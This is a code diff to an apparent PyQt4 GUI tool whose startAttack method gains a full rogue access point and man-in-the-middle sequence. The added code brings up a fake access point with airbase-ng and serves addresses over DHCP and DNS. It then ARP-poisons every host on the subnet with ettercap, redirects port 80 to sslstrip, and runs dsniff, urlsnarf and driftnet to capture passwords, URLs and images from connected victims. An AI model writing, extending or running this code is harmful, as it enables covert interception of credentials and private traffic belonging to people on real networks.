@@ -86,12 +86,46 @@ class StartQT4(QtGui.QMainWindow):
                 pass
 
     def startAttack(self):
+        mainLog = self.ui.plainTextEdit.insertPlainText
         global depend
         for a in depend.keys():
             if depend[a]=='':
                 self.ui.plainTextEdit.insertPlainText("please install dependancies before attempting attack\n")
                 return
-        self.checkdhcpdconf()
+        if self.checkdhcpdconf()=="no":
+            return
+        # start all the interfaces, save them as python variables
+        mainLog('starting Airmon-ng on' + self.ui.lineEdit.text() + "\n")
+        airmon = pp([depend['airmon']['name'], self.ui.lineEdit.text()], stdout = subprocess.PIPE)
+        mainLog('creating Symbolic Link\n')
+        # fix the next line
+        ln = pp(['ln', '-s', '/var/run/dhp3-server/dhcpd.pid', '/var/run/dhcpd.pid'], stdout = subprocess.PIPE)
+        mainLog('creating access point with name %s on channel 1\n'%self.ui.lineEdit_3.text())
+        airbase = pp(['airbase-ng','-c','l','-e', '"'+self.ui.lineEdit_3.text()+'"', 'mon0'],stdout=subprocess.PIPE)
+        pp(['ifconfig','at0','up'], stdout=subprocess.PIPE)
+        pp(['ifconfig','at0',self.ui.lineEdit_4.text(),'netmask', self.ui.lineEdit_6.text()], stdout=subprocess.PIPE)
+        pp(['route','add','-net',self.ui.lineEdit_5.text(), 'netmask', self.ui.lineEdit_6.text(), 'gw', self.ui.lineEdit_4.text()], stdout=subprocess.PIPE)
+        mainLog('Start DHCPD on interface at0\n')
+        dhcpd = pp([depend['dhcpd']['name'],'-cf',depend['dhcpd']['conf'], 'at0'], stdout=subprocess.PIPE)
+        mainLog('Start DNS masq\n')
+        dnsmasq = pp(['/etc/init.d/'+depend['dnsmasq']['name'], 'restart'], stdout=subprocess.PIPE)
+        mainLog('Launching ettercap, poisoning all hosts on the at0 interface\'s subnet\n')
+        ettercap = pp(['ettercap', '-Tzqu', '-i', 'at0'], stdout=subprocess.PIPE)
+        mainLog('setting up iptable forwarding\n')
+        pp(['iptables','--table','nat','--append','PREROUTING','-p','tcp','--dport','80','-j','REDIRECT','--to-port','10000'],stdout=subprocess.PIPE)
+        pp(['iptables','--table','nat','--append','POSTROUTING','--out-interface',self.ui.lineEdit_2.text(),'-j','MASQUERADE'],stdout=subprocess.PIPE)
+        pp(['iptables','--append','FORWARD','--in-interface','at0','-j','ACCEPT'],stdout=subprocess.PIPE)
+
+        pp(['echo','1','>','/proc/sys/net/ipv4/ip_forward'], stdout=subprocess.PIPE)
+        mainLog('starting urlsnarf\n')
+        pp(['driftnet','-v','-i','at0'],stdout=subprocess.PIPE)
+        urlsnarf = pp(['urlsnarf','-i','at0'],stdout=subprocess.PIPE)
+        dsniff = pp([depend['term']['name'], '--geometry=31x4-1-1', '-x', 'sh', '-c', '"dsniff -m -i at0 -d -w dsniff'+__import__('time').ctime()+'.log"'])
+        sslstrip = pp([depend['sslstrip']['name'], '-a', '-k', '-f'], stdout=subprocess.PIPE)
+        
+
+
+        
 
     def checkdhcpdconf(self):
         mainLog = self.ui.plainTextEdit.insertPlainText
@@ -103,7 +137,7 @@ class StartQT4(QtGui.QMainWindow):
             out, err = gerp.communicate()
             if out:
                 self.ui.plainTextEdit.insertPlainText("current settings may already exist, please edit %s and select 'No' next time you are asked to modify dhcpd.conf\n"%depend['dhcpd']['conf'])
-                return
+                return "no"
             else:
                 dhcpdconfile = file(depend['dhcpd']['conf'],'r')
                 mainLog('creating backup of dhcpd.conf...\n')
